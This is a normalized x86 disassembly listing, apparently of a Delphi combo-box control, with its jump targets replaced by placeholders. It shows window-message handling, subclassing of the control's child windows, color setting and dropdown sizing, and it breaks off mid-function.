call sub_453a88
push eax
call SendMessageA
mov ebx eax
test ebx ebx
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4425e2
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c50
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b864
call sub_40395c
sub_4425ec
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44265f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
call sub_4043e0
push eax
push esi
push 0x14a
mov eax [ ebx + 0x10 ]
call sub_453a88
push eax
call SendMessageA
test eax eax
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442666
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c50
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b864
call sub_40395c
sub_44266c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_44f7b4
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x91
mov eax ebx
call sub_44c948
mov edx 0x19
mov eax ebx
call sub_44c96c
mov dl 0x1
mov eax ebx
call sub_453cbc
xor edx edx
mov eax ebx
call sub_44d350
mov dl 0x1
mov eax [ r-xdata ]
call sub_42435c
mov esi eax
mov [ ebx + 0x208 ] esi
mov eax esi
mov edx ebx
call sub_44bd68
mov [ ebx + 0x238 ] 0x10
push ebx
push sub_442a10
call sub_4217e4
mov [ ebx + 0x24c ] eax
push ebx
push sub_442b08
call sub_4217e4
mov [ ebx + 0x254 ] eax
mov [ ebx + 0x210 ] 0x8
mov [ ebx + 0x214 ] 0xffffffff
mov [ ebx + 0x260 ] 0xffffffff
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
sub_442760
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
mov eax esi
call sub_453d8c
test al al
je r-xdata
mov eax [ esi + 0x254 ]
call sub_4643c4
mov eax [ esi + 0x24c ]
call sub_4643c4
mov eax [ esi + 0x208 ]
call sub_403190
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44f8d8
test bl bl
jle r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xac ]
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_4427e2
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
call sub_450e7c
xor eax eax
mov [ ebx + 0x240 ] eax
xor eax eax
mov [ ebx + 0x244 ] eax
xor eax eax
mov [ ebx + 0x248 ] eax
pop ebx
retn
sub_44282c
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x157
mov eax ebx
call sub_453a88
push eax
call SendMessageA
cmp eax 0x1
sbb eax eax
inc eax
pop ebx
retn
sub_442850
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
push 0x0
xor eax eax
mov al bl
push eax
push 0x14f
mov eax esi
call sub_453a88
push eax
call SendMessageA
mov edx esp
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax esi
call sub_453a88
push eax
call InvalidateRect
add esp 0x10
pop esi
pop ebx
retn
sub_442898
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x1
je r-xdata
push 0x0
push 0x0
push 0x147
mov eax ebx
call sub_453a88
push eax
call SendMessageA
pop ebx
retn
mov eax [ ebx + 0x214 ]
pop ebx
retn
sub_4428c4
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
cmp esi eax
je r-xdata
mov [ ebx + 0x214 ] esi
pop esi
pop ebx
retn
pop esi
pop ebx
retn
push 0x0
push esi
push 0x14e
mov eax ebx
call sub_453a88
push eax
call SendMessageA
sub_442900
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jge r-xdata
cmp esi [ ebx + 0x20c ]
je r-xdata
xor esi esi
pop esi
pop ebx
retn
mov [ ebx + 0x20c ] esi
mov eax ebx
call sub_453d8c
test al al
je r-xdata
push 0x0
push esi
push 0x141
mov eax ebx
call sub_453a88
push eax
call SendMessageA
sub_442950
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x64 ] 0x0
je r-xdata
pop esi
retn
mov eax [ esi + 0x64 ]
push eax
mov eax esi
call sub_453a88
push eax
call SetWindowTextA
sub_44298c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_44282c
test al al
je r-xdata
pop esi
pop ebx
retn
or [ esi + 0xc ] 0x4
sub_4429c4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_4530a0
pop esi
pop ebx
retn
mov eax ebx
call sub_451028
sub_4429e8
push ebx
mov ebx eax
mov eax ebx
call sub_44ed64
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x276 ] 0x2
jae r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_442a10
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ esi ] 0x112
jne r-xdata
mov eax [ esi ]
cmp eax 0x100
jb r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x74 ]
jmp r-xdata
mov eax [ ebx + 0x250 ]
push eax
mov edx esi
mov ecx [ ebx + 0x240 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xf4 ]
mov eax [ esi ]
sub eax 0x30
je r-xdata
cmp eax 0x108
ja r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
sub eax 0x1d1
je r-xdata
mov eax ebx
call sub_464518
mov edi eax
test edi edi
je r-xdata
push 0x0
push 0x3
push 0xd3
mov eax [ ebx + 0x240 ]
push eax
call SendMessageA
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
sub eax 0x2
jne r-xdata
mov ecx esi
mov edx ebx
mov eax edi
mov edi [ eax ]
call [ edi + 0xf0 ]
test al al
jne r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax ebx
call sub_44ccd0
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406b14
push eax
push 0x0
push 0x202
mov eax [ ebx + 0x240 ]
push eax
call SendMessageA
or ecx 0xffffffff
xor edx edx
mov eax ebx
call sub_44d834
jmp r-xdata
sub_442b3c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_442df3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x104
jg r-xdata
cmp eax 0xbd00
jg r-xdata
je r-xdata
sub eax 0xbd02
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp esi [ eax + 0x244 ]
je r-xdata
cmp eax 0x87
jg r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub eax 0x2
je r-xdata
sub eax 0x105
je r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
push eax
push esi
mov eax [ ebp + 0x8 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
cmp [ ebx ] 0x203
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4528dc
test al al
je r-xdata
sub eax 0x100
je r-xdata
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub eax 0x2
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4529c4
test al al
je r-xdata
sub eax 0xfb
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x80
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44282c
test al al
je r-xdata
sub eax 0x7
je r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46dcc4
jmp r-xdata
sub eax 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffe9
call sub_40338c
dec eax
je r-xdata
mov [ ebx + 0xc ] 0x4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_464518
mov edi eax
test edi edi
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_440c34
test al al
je r-xdata
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_452a8c
test al al
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe8 ]
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
je r-xdata
sub eax 0x7c
je r-xdata
movsx eax [ ebx + 0x8 ]
mov [ ebp - 0xc ] eax
movsx eax [ ebx + 0xa ]
mov [ ebp - 0x8 ] eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_453a88
push eax
push esi
call MapWindowPoints
mov ax [ ebp - 0xc ]
mov [ ebx + 0x8 ] ax
mov ax [ ebp - 0x8 ]
mov [ ebx + 0xa ] ax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov di [ ebx + 0x4 ]
cmp di 0xd
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_44282c
test al al
je r-xdata
cmp di 0x1b
jne r-xdata
mov [ ebx + 0xc ] 0xffffffff
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_442850
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_442e18
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ esi ]
sub eax 0x5
je r-xdata
mov edi [ esi ]
cmp edi 0x201
je r-xdata
cmp [ ebx + 0x25c ] 0x0
je r-xdata
sub eax 0xfd
je r-xdata
mov eax ebx
call sub_44d8fc
test al al
jne r-xdata
cmp edi 0x203
jne r-xdata
mov edx esi
mov eax ebx
call sub_45149c
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov edx esi
mov eax ebx
call sub_452a8c
test al al
jne r-xdata
add eax 0xffffffd0
sub eax 0x7
jb r-xdata
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov di [ esi + 0x4 ]
cmp di 0xd
je r-xdata
mov eax [ ebx + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_423580
push eax
mov eax [ esi + 0x4 ]
push eax
call SetTextColor
mov eax [ ebx + 0x170 ]
call sub_424204
call sub_423580
push eax
mov eax [ esi + 0x4 ]
push eax
call SetBkColor
mov eax [ ebx + 0x170 ]
call sub_424240
mov [ esi + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov edx esi
mov eax ebx
call sub_451408
test al al
jne r-xdata
mov eax ebx
call sub_44282c
test al al
je r-xdata
cmp di 0x1b
jne r-xdata
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x14 ]
jmp r-xdata
xor edx edx
mov eax ebx
call sub_442850
jmp r-xdata
sub_442f26
add [ eax ] al
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_443084
push [ fs : eax ]
mov [ fs : eax ] esp
movzx eax [ edx + 0x6 ]
cmp eax 0x8
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44308b
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
jmp [ eax * 4 + jump_table_442f54 ]
mov eax edi
mov si 0xffe9
call sub_40338c
jmp r-xdata
mov eax edi
mov si 0xffb3
call sub_40338c
jmp r-xdata
mov [ edi + 0x25d ] 0x0
mov eax edi
mov si 0xffb1
call sub_40338c
mov eax edi
mov edx [ eax ]
call [ edx + 0xf0 ]
cmp [ edi + 0x25d ] 0x0
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
lea ecx [ ebp - 0x4 ]
mov eax [ edi + 0x23c ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_44d1bc
mov eax edi
mov si 0xffeb
call sub_40338c
mov eax edi
mov si 0xffb2
call sub_40338c
jmp r-xdata
mov eax edi
mov si 0xffb0
call sub_40338c
jmp r-xdata
mov [ edi + 0x25e ] 0x1
mov [ edi + 0x25d ] 0x1
mov eax edi
call sub_45220c
jmp r-xdata
mov [ edi + 0x25e ] 0x0
mov [ edi + 0x25d ] 0x1
mov eax edi
call sub_4522f8
push 0x0
push 0x0
push 0x1f
mov eax edi
call sub_453a88
push eax
call PostMessageA
cmp [ edi + 0x25e ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x14f
mov eax edi
call sub_453a88
push eax
call PostMessageA
jmp r-xdata
sub_4430b8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov esi ecx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_443161
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x208 ]
call sub_44bd80
cmp [ ebx + 0x282 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x208 ]
call sub_4245b0
test esi esi
jl r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov ax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x284 ]
call [ ebx + 0x280 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443168
lea eax [ ebp - 0x14 ]
call sub_403f20
retn
lea ecx [ ebp - 0x14 ]
mov edx esi
mov eax [ ebx + 0x23c ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x10 ]
add edx 0x2
mov ecx [ ebp - 0xc ]
mov eax [ ebx + 0x208 ]
call sub_42479c
sub_443194
push esi
push edi
mov esi eax
mov eax esi
call sub_44f248
mov edi [ esi + 0x214 ]
cmp edi 0xffffffff
je r-xdata
pop edi
pop esi
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
sub_4431bc
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax esi
call sub_453d8c
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
call GetFocus
cmp eax [ esi + 0x240 ]
je r-xdata
mov bl 0x1
cmp eax [ esi + 0x244 ]
je r-xdata
xor ebx ebx
jmp r-xdata
sub_443210
push ebx
push esi
cmp [ eax + 0x222 ] 0x0
je r-xdata
mov si 0xffb3
call sub_40338c
pop esi
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x224 ]
call [ ebx + 0x220 ]
pop esi
pop ebx
retn
sub_44323c
push ebx
mov ebx eax
mov eax ebx
call sub_450a40
push 0x0
mov eax [ ebx + 0x20c ]
push eax
push 0x141
mov eax ebx
call sub_453a88
push eax
call SendMessageA
xor eax eax
mov [ ebx + 0x240 ] eax
xor eax eax
mov [ ebx + 0x244 ] eax
pop ebx
retn
sub_443274
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x104 ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
cmp ebx eax
jle r-xdata
cmp ebx 0x1
jge r-xdata
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x25c ] 0x1
xor eax eax
push ebp
push sub_44330a
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x9e
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xfc ]
imul ebx
mov edx [ ebp - 0x4 ]
add eax [ edx + 0x4c ]
add eax 0x2
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
push eax
call SetWindowPos
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443311
mov eax [ ebp - 0x4 ]
mov [ eax + 0x25c ] 0x0
retn
mov ebx 0x1
sub_443311
push 0x5f
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
push eax
call SetWindowPos
pop ebx
pop ecx
pop ebp
retn
sub_443330
push esi
push edi
mov esi eax
mov edi [ esi + 0x23c ]
test edi edi
je r-xdata
mov [ esi + 0x23c ] edx
pop edi
pop esi
retn
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop edi
pop esi
retn
sub_443360
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4433df
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4433e6
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
lea ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x23c ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax esi
pop edx
mov ebx [ eax ]
call [ ebx + 0xd4 ]
sub_4433ec
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_44342c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4043d0
xor eax eax
push ebp
push sub_443475
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x23c ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44347c
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
sub_443484
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_44266c
mov eax ebx
mov edx [ eax ]
call [ edx + 0xf8 ]
mov dl 0x1
call sub_403160
mov esi eax
mov [ ebx + 0x23c ] esi
mov [ esi + 0x10 ] ebx
mov [ ebx + 0x238 ] 0x10
mov [ ebx + 0x276 ] 0x0
xor eax eax
mov [ ebx + 0x26c ] eax
mov [ ebx + 0x268 ] 0x1
mov [ ebx + 0x290 ] 0x0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_443508
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
mov eax [ esi + 0x23c ]
call sub_403190
mov eax [ esi + 0x278 ]
call sub_403190
mov edx ebx
and dl 0xfc
mov eax esi
call sub_442760
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_443558
push ebx
mov ebx eax
cmp dl [ ebx + 0x276 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x276 ] dl
cmp dl 0x1
jne r-xdata
mov eax [ r-xdata ]
or eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
call sub_451028
sub_4435bc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_450914
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_450840
mov eax [ esi + 0x4 ]
or eax 0x200240
xor edx edx
mov dl [ ebx + 0x276 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x275 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x274 ]
or eax [ edx * 4 + rw-data ]
mov [ esi + 0x4 ] eax
pop esi
pop ebx
retn
sub_44361d
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov ebx eax
mov eax ebx
call sub_44323c
mov eax ebx
call sub_453a88
mov [ ebx + 0x248 ] eax
mov esi [ ebx + 0x278 ]
test esi esi
je r-xdata
mov al [ ebx + 0x276 ]
sub al 0x2
jae r-xdata
mov edx esi
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebx + 0x278 ]
call sub_403190
xor eax eax
mov [ ebx + 0x278 ] eax
cmp [ ebx + 0x260 ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x5
mov eax ebx
call sub_453a88
push eax
call GetWindow
mov esi eax
test esi esi
je r-xdata
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebx + 0x260 ]
jge r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x240 ] 0x0
je r-xdata
cmp [ ebx + 0x276 ] 0x1
jne r-xdata
push 0x0
mov eax [ ebx + 0x260 ]
push eax
push 0x14e
mov eax ebx
call sub_453a88
push eax
call SendMessageA
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebx + 0x260 ] eax
push 0x0
push 0x3
push 0xd3
mov eax [ ebx + 0x240 ]
push eax
call SendMessageA
mov edi esi
mov [ ebx + 0x240 ] edi
push 0xfffffffc
push edi
call GetWindowLongA
mov [ ebx + 0x250 ] eax
mov eax [ ebx + 0x24c ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x240 ]
push eax
call SetWindowLongA
mov edi esi
mov [ ebx + 0x244 ] edi
push 0xfffffffc
push edi
call GetWindowLongA
mov [ ebx + 0x258 ] eax
mov eax [ ebx + 0x254 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x244 ]
push eax
call SetWindowLongA
push 0x2
push esi
call GetWindow
mov esi eax
sub_443760
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax ebx
call sub_450e24
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ ebx + 0x260 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov esi eax
mov [ ebx + 0x278 ] esi
mov edx [ ebx + 0x23c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_4437b0
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ ebx + 0x276 ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x170 ]
call sub_424240
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
mov [ esi + 0xc ] 0x1
jmp r-xdata
add esp 0x10
pop esi
pop ebx
retn
sub_443804
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push ebx
push 0x140
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_453a88
push eax
call SendMessageA
mov eax [ esi ]
cmp eax [ ebx ]
seta al
pop esi
pop ebx
pop ebp
retn
sub_443830
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4438ec
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_44d18c
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push 0x140
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_453a88
push eax
call SendMessageA
mov ecx [ ebp - 0x8 ]
sub ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
inc edx
lea eax [ ebp - 0xc ]
call sub_404480
push 0x0
push 0xffffffff
push 0x14e
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_453a88
push eax
call SendMessageA
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xc ]
call sub_44d1bc
mov bx [ ebp - 0x4 ]
mov edx ebx
mov eax ebx
call sub_406b34
push eax
push 0x0
push 0x142
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_453a88
push eax
call SendMessageA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4438f3
lea eax [ ebp - 0xc ]
call sub_403f20
retn
sub_4438f8
push ebp
mov ebp esp
mov ecx 0xb
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_443cb0
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_452a6c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x268 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443cb7
lea eax [ ebp - 0x58 ]
mov edx 0x5
call sub_403f44
lea eax [ ebp - 0x44 ]
call sub_403f20
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_403f44
lea eax [ ebp - 0x38 ]
mov edx 0x2
call sub_403f44
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_403f44
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x276 ]
sub al 0x2
jae r-xdata
call GetTickCount
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x26c ]
cmp eax 0x1f4
jb r-xdata
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
call sub_44d18c
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
add eax 0x270
call sub_403f74
jmp r-xdata
call GetTickCount
mov edx [ ebp - 0x4 ]
mov [ edx + 0x26c ] eax
mov eax [ ebp - 0x4 ]
add eax 0x270
call sub_403f20
mov al [ ebx ]
sub al 0x8
je r-xdata
push ebp
lea edx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
call sub_443804
pop ecx
test al al
je r-xdata
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
